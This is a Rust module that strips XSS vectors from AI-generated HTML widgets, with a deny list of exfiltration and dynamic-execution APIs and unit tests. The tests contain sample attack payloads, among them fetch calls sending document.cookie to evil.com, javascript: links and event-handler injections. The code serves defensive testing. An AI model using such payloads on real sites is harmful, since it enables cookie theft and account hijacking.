//! Server-side HTML sanitization for AI-generated widget content.
//!
//! Added as a defense-in-depth measure (#3545): before any client-side
//! renderer (WebView2 / sandboxed iframe) executes the HTML produced by
//! `GenerateWidget`, the backend strips well-known XSS vectors so that
//! prompt-injected or model-hallucinated malicious code is neutralized
//! even if the client sandbox fails.
//!
//! This is intentionally dependency-free (no `ammonia` / `scraper` crate)
//! because the project cannot add new Cargo dependencies. The scanner is
//! tag-oriented rather than a full HTML parse — sufficient for stripping
//! the high-risk patterns documented below while preserving legitimate
//! widget interactivity.

// ── Dangerous patterns ─────────────────────────────────────────────────

/// Substrings that indicate a `<script>` block is performing network
/// exfiltration or DOM access beyond the widget sandbox. If any of these
/// appear inside a script block, the entire block is stripped.
const DANGEROUS_SCRIPT_PATTERNS: &[&str] = &[
    // Network exfiltration
    "fetch(",
    "XMLHttpRequest",
    "WebSocket",
    "EventSource",
    "navigator.sendBeacon",
    "new Worker(",
    "new SharedWorker(",
    "import(",
    // Cross-origin DOM access
    "parent.",
    "parent[",
    "top.",
    "top[",
    "window.parent",
    "window.top",
    "opener",
    // Storage / cookie exfiltration
    "localStorage",
    "sessionStorage",
    "document.cookie",
    "indexedDB",
    // Dynamic code execution (can be used to bypass all checks above)
    "eval(",
    "Function(",
    "setTimeout(",
    "setInterval(",
    "new Function",
    "document.write",
    "document.writeln",
    // Meta-refresh / navigation
    "location.href",
    "location.assign",
    "location.replace",
    "window.open",
];

/// Tags whose entire subtree is removed (opening tag, content, closing tag).
/// These can load external resources or break out of the widget sandbox.
const DANGEROUS_TAGS: &[&str] = &[
    "iframe", "object", "embed", "base", "link", "meta", "form", "frame", "frameset", "applet",
    "portal",
];

/// Attribute name prefixes that indicate event handlers (onclick, onerror, …).
/// These are stripped from every surviving tag.
const EVENT_HANDLER_PREFIX: &str = "on";

/// Protocols that allow script execution when used in href/src/action.
const DANGEROUS_PROTOCOLS: &[&str] = &[
    "javascript:",
    "vbscript:",
    "data:text/html",
    "data:application/javascript",
    "data:application/x-javascript",
];

// ── Public API ─────────────────────────────────────────────────────────

/// Sanitize AI-generated HTML widget content.
///
/// Returns a cleaned HTML string with the following modifications:
///
/// 1. `<script>` blocks containing network-exfiltration or dynamic-execution
///    APIs are stripped entirely. Safe scripts (pure DOM/CSS manipulation
///    within the widget) are preserved.
/// 2. Dangerous container tags (`<iframe>`, `<object>`, `<embed>`, `<form>`,
///    `<link>`, `<base>`, `<meta http-equiv>`, …) and their content are removed.
/// 3. All `on*` event-handler attributes are stripped from surviving tags.
/// 4. `javascript:`, `vbscript:`, and executable `data:` protocols in
///    `href` / `src` / `action` / `formaction` attributes are neutralized.
///
/// The function is idempotent: sanitizing already-clean HTML is a no-op.
pub(crate) fn sanitize_widget_html(html: &str) -> String {
    let after_scripts = strip_dangerous_scripts(html);
    let after_tags = strip_dangerous_tags(&after_scripts);
    sanitize_attributes(&after_tags)
}

// ── Implementation ─────────────────────────────────────────────────────

/// Check if a script block's content contains any dangerous pattern.
fn is_dangerous_script(content: &str) -> bool {
    let lowered = content.to_ascii_lowercase();
    DANGEROUS_SCRIPT_PATTERNS
        .iter()
        .any(|p| lowered.contains(&p.to_ascii_lowercase()))
}

/// Remove `<script ...>...</script>` blocks whose content is dangerous.
/// Safe script blocks (no network/dynamic-execution APIs) are preserved.
fn strip_dangerous_scripts(html: &str) -> String {
    let lowered = html.to_ascii_lowercase();
    let bytes = html.as_bytes();
    let mut out = String::with_capacity(html.len());
    let mut pos = 0;

    while pos < html.len() {
        // Find next `<script`
        if let Some(rel) = lowered[pos..].find("<script") {
            let script_start = pos + rel;
            // Copy everything before the script tag.
            out.push_str(&html[pos..script_start]);

            // Find the end of the opening `<script ...>` tag.
            let tag_end = match lowered[script_start..].find('>') {
                Some(offset) => script_start + offset + 1,
                None => {
                    // Unterminated tag — copy the rest and stop.
                    out.push_str(&html[script_start..]);
                    return out;
                }
            };

            // Find the matching `</script>`.
            let close = lowered[tag_end..].find("</script>");
            match close {
                Some(offset) => {
                    let content_end = tag_end + offset;
                    let close_end = content_end + "</script>".len();
                    let script_content = &html[tag_end..content_end];

                    if is_dangerous_script(script_content) {
                        // Replace dangerous script with a safe comment marker.
                        out.push_str("<!-- script removed: security policy -->");
                    } else {
                        // Keep safe script verbatim.
                        out.push_str(&html[script_start..close_end]);
                    }
                    pos = close_end;
                }
                None => {
                    // No closing tag — treat the rest as script content.
                    let script_content = &html[tag_end..];
                    if !is_dangerous_script(script_content) {
                        out.push_str(&html[script_start..]);
                    } else {
                        out.push_str("<!-- script removed: security policy -->");
                    }
                    return out;
                }
            }
        } else {
            out.push_str(&html[pos..]);
            break;
        }
    }

    // We built `out` by slicing `html` which is valid UTF-8, so every boundary
    // landed on a UTF-8 char boundary. The `.push_str` calls above are safe.
    let _ = bytes; // suppress unused warning
    out
}

/// Remove dangerous container tags and their content.
fn strip_dangerous_tags(html: &str) -> String {
    let mut result = html.to_string();
    for tag in DANGEROUS_TAGS {
        result = remove_tag_subtree(&result, tag);
    }
    result
}

/// Remove all occurrences of `<tag ...>...</tag>` (including content) and
/// standalone `<tag ... />` / `<tag ...>` (void-style) for the given tag name.
fn remove_tag_subtree(html: &str, tag: &str) -> String {
    let lowered = html.to_ascii_lowercase();
    let open_pat = format!("<{}", tag);
    let close_pat = format!("</{}", tag);

    let mut out = String::with_capacity(html.len());
    let mut pos = 0;

    while pos < html.len() {
        if let Some(rel) = lowered[pos..].find(&open_pat) {
            let tag_start = pos + rel;
            // Verify it's actually a tag boundary (next char is whitespace, '>', or '/').
            let after_pat = tag_start + open_pat.len();
            let next_ch = html[after_pat..].chars().next();
            let valid_boundary =
                matches!(next_ch, Some(' ' | '\t' | '\n' | '\r' | '>' | '/') | None);
            if !valid_boundary {
                // Not a real tag (e.g. `<metadatax>`), just copy one char.
                let ch_end = html[pos..]
                    .char_indices()
                    .nth(1)
                    .map(|(i, _)| pos + i)
                    .unwrap_or(pos + 1);
                out.push_str(&html[pos..ch_end]);
                pos = ch_end;
                continue;
            }

            // Copy text before the tag.
            out.push_str(&html[pos..tag_start]);

            // Find end of opening tag.
            let open_end = match lowered[tag_start..].find('>') {
                Some(off) => tag_start + off + 1,
                None => {
                    // Unterminated — drop the rest.
                    return out;
                }
            };

            // Check if it's self-closing.
            let is_self_closing = html[tag_start..open_end].ends_with("/>");

            if is_self_closing {
                // Self-closing tag — just skip it.
                pos = open_end;
                continue;
            }

            // Look for matching close tag.
            let remainder = &lowered[open_end..];
            if let Some(close_rel) = remainder.find(&close_pat) {
                let close_start = open_end + close_rel;
                let close_end = match lowered[close_start..].find('>') {
                    Some(off) => close_start + off + 1,
                    None => {
                        // Malformed close — drop rest.
                        return out;
                    }
                };
                // Skip the entire subtree.
                pos = close_end;
            } else {
                // No closing tag — skip just the opening tag.
                pos = open_end;
            }
        } else {
            out.push_str(&html[pos..]);
            break;
        }
    }

    out
}

/// Strip `on*` event-handler attributes and neutralize dangerous protocols
/// in every tag within the HTML.
fn sanitize_attributes(html: &str) -> String {
    let bytes = html.as_bytes();
    let mut out = String::with_capacity(html.len());
    let mut pos = 0;

    while pos < html.len() {
        match bytes[pos] {
            b'<' => {
                // Find the matching `>`.
                let close_rel = html[pos..].find('>');
                match close_rel {
                    Some(off) => {
                        let tag_end = pos + off + 1;
                        let tag_content = &html[pos..tag_end];
                        let cleaned = clean_tag_attributes(tag_content);
                        out.push_str(&cleaned);
                        pos = tag_end;
                    }
                    None => {
                        out.push_str(&html[pos..]);
                        break;
                    }
                }
            }
            _ => {
                // Copy until next `<`.
                let next_lt = html[pos..].find('<');
                match next_lt {
                    Some(off) => {
                        out.push_str(&html[pos..pos + off]);
                        pos += off;
                    }
                    None => {
                        out.push_str(&html[pos..]);
                        break;
                    }
                }
            }
        }
    }

    out
}

/// Clean a single tag (e.g. `<div class="x" onclick="evil()">`) by removing
/// event-handler attributes and neutralizing dangerous protocols.
fn clean_tag_attributes(tag: &str) -> String {
    // Quick check: if there's no space inside the tag, it's a simple tag like
    // `<div>` or `</div>` — return as-is.
    let interior = match tag.strip_prefix('<').and_then(|t| t.strip_suffix('>')) {
        Some(inner) => inner,
        None => return tag.to_string(), // e.g. `<!DOCTYPE html>`
    };

    // Don't touch comments, doctype, or CDATA.
    if interior.starts_with('!') || interior.starts_with("!--") || interior.starts_with("![CDATA[")
    {
        return tag.to_string();
    }

    // Split tag name from attributes.
    // Find the first whitespace that separates the tag name from attributes.
    let split_pos = interior.find(|c: char| c.is_whitespace());
    let (tag_name, attrs_str) = match split_pos {
        Some(p) => (&interior[..p], &interior[p..]),
        None => return tag.to_string(), // `<div>` — no attributes
    };

    // Don't process closing tags `</div>`.
    if tag_name.starts_with('/') {
        return tag.to_string();
    }

    // Parse attributes. We need to handle quoted values ("..." and '...').
    let cleaned_attrs = clean_attribute_list(attrs_str);

    // Reconstruct the tag.
    let self_closing = cleaned_attrs.ends_with('/');
    let attrs_trimmed = cleaned_attrs.trim_end();
    let attrs_core = if self_closing {
        attrs_trimmed.trim_end_matches('/').trim_end()
    } else {
        attrs_trimmed
    };
    let attrs_final = if attrs_core.is_empty() {
        String::new()
    } else {
        format!("{} ", attrs_core)
    };

    if self_closing {
        format!("<{}{}/>", tag_name, attrs_final)
    } else {
        format!("<{}{}>", tag_name, attrs_final)
    }
}

/// Walk through the attribute portion of a tag and remove dangerous attributes.
fn clean_attribute_list(attrs: &str) -> String {
    let mut out = String::with_capacity(attrs.len());
    let chars: Vec<char> = attrs.chars().collect();
    let mut i = 0;

    while i < chars.len() {
        // Skip leading whitespace.
        if chars[i].is_whitespace() {
            out.push(chars[i]);
            i += 1;
            continue;
        }

        // Collect attribute name (until '=', whitespace, or end).
        let name_start = i;
        while i < chars.len() && !chars[i].is_whitespace() && chars[i] != '=' && chars[i] != '/' {
            i += 1;
        }
        let attr_name: String = chars[name_start..i].iter().collect();
        let attr_name_lower = attr_name.to_ascii_lowercase();

        // Check for value.
        let mut had_value = false;
        let mut value_start = i;
        let mut value_end = i;

        if i < chars.len() && chars[i] == '=' {
            i += 1; // skip '='
            had_value = true;
            if i < chars.len() && (chars[i] == '"' || chars[i] == '\'') {
                let quote = chars[i];
                i += 1; // skip opening quote
                value_start = i;
                while i < chars.len() && chars[i] != quote {
                    i += 1;
                }
                value_end = i;
                if i < chars.len() {
                    i += 1; // skip closing quote
                }
            } else {
                value_start = i;
                while i < chars.len() && !chars[i].is_whitespace() && chars[i] != '/' {
                    i += 1;
                }
                value_end = i;
            }
        }

        let attr_value: String = chars[value_start..value_end].iter().collect();

        // Decision: keep or drop this attribute?
        let is_event_handler = attr_name_lower.starts_with(EVENT_HANDLER_PREFIX)
            && attr_name_lower.len() > 2
            && attr_name_lower
                .as_bytes()
                .get(2)
                .map(|c| c.is_ascii_alphabetic())
                .unwrap_or(false);

        let is_url_attr = matches!(
            attr_name_lower.as_str(),
            "href" | "src" | "action" | "formaction" | "xlink:href" | "data"
        );

        let has_dangerous_protocol = is_url_attr
            && DANGEROUS_PROTOCOLS
                .iter()
                .any(|p| attr_value.to_ascii_lowercase().starts_with(p));

        if is_event_handler {
            // Drop the attribute entirely (including its value).
            // Also drop any trailing space we may have already added.
            while out.ends_with(' ') {
                out.pop();
            }
            continue;
        } else if has_dangerous_protocol {
            // Keep attribute name but replace the value.
            out.push_str(&attr_name);
            out.push_str("=\"about:blank\"");
            // If there was no closing quote consumed, we already moved past the value.
        } else {
            // Keep attribute verbatim.
            let reconstructed: String = if had_value {
                let value_str: String = chars[name_start..i.min(chars.len())].iter().collect();
                value_str
            } else {
                attr_name.clone()
            };
            out.push_str(&reconstructed);
        }
    }

    out
}

// ── Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Script block stripping ──────────────────────────────────────────

    #[test]
    fn strips_script_with_fetch_exfiltration() {
        let html =
            r#"<div>Hello</div><script>fetch('https://evil.com?d='+document.cookie)</script>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("fetch("), "fetch should be stripped");
        assert!(!clean.contains("evil.com"));
        assert!(clean.contains("Hello"), "safe content preserved");
        assert!(
            clean.contains("script removed"),
            "dangerous script replaced with marker"
        );
    }

    #[test]
    fn strips_script_with_websocket() {
        let html = r#"<script>new WebSocket('wss://evil.com')</script>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("WebSocket"));
    }

    #[test]
    fn strips_script_with_eval() {
        let html = r#"<script>eval('alert(1)')</script>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("eval("));
    }

    #[test]
    fn strips_script_with_localstorage() {
        let html = r#"<script>localStorage.setItem('key','val')</script>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("localStorage"));
    }

    #[test]
    fn preserves_safe_script_block() {
        let html = r#"<script>document.getElementById('x').innerText='hi'</script>"#;
        let clean = sanitize_widget_html(html);
        assert!(
            clean.contains("getElementById"),
            "safe DOM script should be preserved"
        );
    }

    #[test]
    fn strips_script_case_insensitive() {
        let html = r#"<SCRIPT>FETCH('https://evil.com')</SCRIPT>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("FETCH"));
        assert!(!clean.to_ascii_lowercase().contains("fetch("));
    }

    #[test]
    fn handles_script_with_attributes() {
        let html = r#"<script type="text/javascript">fetch('evil')</script>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("fetch("));
    }

    #[test]
    fn handles_unterminated_script() {
        let html = r#"<script>fetch('evil')"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("fetch("));
    }

    // ── Dangerous tag removal ───────────────────────────────────────────

    #[test]
    fn removes_iframe_tag() {
        let html = r#"<iframe src="javascript:alert(1)"></iframe>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("iframe"));
        assert!(!clean.contains("javascript:"));
    }

    #[test]
    fn removes_iframe_with_content() {
        let html = r#"<iframe><p>hidden</p></iframe>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("iframe"));
        assert!(!clean.contains("hidden"));
    }

    #[test]
    fn removes_object_tag() {
        let html = r#"<object data="evil.swf"></object>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("object"));
    }

    #[test]
    fn removes_embed_tag() {
        let html = r#"<embed src="evil.swf">"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("embed"));
    }

    #[test]
    fn removes_form_tag() {
        let html = r#"<form action="javascript:alert(1)"><input></form>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("form"));
        assert!(!clean.to_ascii_lowercase().contains("action="));
    }

    #[test]
    fn removes_link_tag() {
        let html = r#"<link rel="stylesheet" href="evil.css">"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("<link"));
    }

    #[test]
    fn removes_meta_tag() {
        let html = r#"<meta http-equiv="refresh" content="0;url=evil.com">"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("<meta"));
    }

    #[test]
    fn does_not_remove_lookalike_tags() {
        let html = r#"<metadata>data</metadata>"#;
        let clean = sanitize_widget_html(html);
        assert!(
            clean.contains("metadata"),
            "lookalike tags should not be stripped: {}",
            clean
        );
    }

    // ── Event handler stripping ─────────────────────────────────────────

    #[test]
    fn strips_onclick_attribute() {
        let html = r#"<button onclick="alert(1)">Click</button>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("onclick"));
        assert!(clean.contains("Click"), "tag content preserved");
    }

    #[test]
    fn strips_onerror_attribute() {
        let html = r#"<img src="x" onerror="alert(1)">"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("onerror"));
    }

    #[test]
    fn strips_onload_attribute() {
        let html = r#"<body onload="alert(1)">text</body>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("onload"));
    }

    #[test]
    fn strips_single_quoted_event_handler() {
        let html = r#"<div onclick='alert(1)'>x</div>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("onclick"));
    }

    #[test]
    fn preserves_other_attributes() {
        let html = r#"<div class="widget" id="main" data-value="42">x</div>"#;
        let clean = sanitize_widget_html(html);
        assert!(clean.contains("class=\"widget\""), "class preserved");
        assert!(clean.contains("id=\"main\""), "id preserved");
        assert!(clean.contains("data-value=\"42\""), "data-value preserved");
    }

    // ── Dangerous protocol neutralization ───────────────────────────────

    #[test]
    fn neutralizes_javascript_href() {
        let html = r#"<a href="javascript:alert(1)">link</a>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("javascript:"));
        assert!(clean.contains("about:blank"));
    }

    #[test]
    fn neutralizes_vbscript_href() {
        let html = r#"<a href="vbscript:msgbox(1)">link</a>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("vbscript:"));
    }

    #[test]
    fn neutralizes_data_text_html() {
        let html = r#"<a href="data:text/html,<script>alert(1)</script>">x</a>"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.to_ascii_lowercase().contains("data:text/html"));
    }

    #[test]
    fn preserves_safe_href() {
        let html = r#"<a href="https://example.com">link</a>"#;
        let clean = sanitize_widget_html(html);
        assert!(clean.contains("https://example.com"));
    }

    #[test]
    fn preserves_hash_href() {
        let html = r##"<a href="#section">link</a>"##;
        let clean = sanitize_widget_html(html);
        assert!(clean.contains("#section"));
    }

    // ── Integration / idempotency ───────────────────────────────────────

    #[test]
    fn sanitization_is_idempotent() {
        let html = r#"<div onclick="alert(1)"><script>fetch('evil')</script></div>"#;
        let once = sanitize_widget_html(html);
        let twice = sanitize_widget_html(&once);
        assert_eq!(once, twice, "double sanitization should be a no-op");
    }

    #[test]
    fn preserves_safe_widget() {
        let html = r#"<!DOCTYPE html>
<html>
<head><style>.red { color: red; }</style></head>
<body>
<h1 class="red">Hello</h1>
<button id="btn">Click</button>
<script>document.getElementById('btn').addEventListener('click', () => {
  document.getElementById('btn').textContent = 'Clicked!';
});</script>
</body>
</html>"#;
        let clean = sanitize_widget_html(html);
        // Safe content preserved.
        assert!(clean.contains(".red { color: red; }"), "CSS preserved");
        assert!(clean.contains("Hello"), "text preserved");
        assert!(clean.contains("addEventListener"), "safe script preserved");
        assert!(clean.contains("<button"), "button tag preserved");
        // Dangerous content absent.
        assert!(!clean.to_ascii_lowercase().contains("onclick="));
        assert!(!clean.contains("fetch("));
    }

    #[test]
    fn handles_empty_input() {
        assert_eq!(sanitize_widget_html(""), "");
    }

    #[test]
    fn handles_plain_text() {
        let html = "Just some text, no tags.";
        assert_eq!(sanitize_widget_html(html), html);
    }

    #[test]
    fn handles_multiple_dangerous_scripts() {
        let html = r#"
<script>fetch('evil1')</script>
<p>safe</p>
<script>localStorage.setItem('k','v')</script>
"#;
        let clean = sanitize_widget_html(html);
        assert!(!clean.contains("fetch("));
        assert!(!clean.contains("localStorage"));
        assert!(clean.contains("safe"));
        // Both dangerous scripts should be replaced with markers.
        assert_eq!(
            clean.matches("script removed").count(),
            2,
            "both scripts should be replaced"
        );
    }

    #[test]
    fn full_xss_attack_neutralized() {
        // Classic XSS payload that an attacker might inject via prompt injection.
        let html = r#"<div onmouseover="fetch('https://evil.com?c='+document.cookie)">
<a href="javascript:alert(1)">click</a>
<iframe src="evil.html"></iframe>
<script>eval(atob('base64payload'))</script>
</div>"#;
        let clean = sanitize_widget_html(html);
        assert!(
            !clean.to_ascii_lowercase().contains("onmouseover"),
            "event handler stripped"
        );
        assert!(!clean.contains("fetch("), "fetch stripped");
        assert!(!clean.contains("javascript:"), "js protocol neutralized");
        assert!(
            !clean.to_ascii_lowercase().contains("iframe"),
            "iframe removed"
        );
        assert!(!clean.contains("eval("), "eval stripped");
        assert!(clean.contains("click"), "safe text preserved");
    }
}
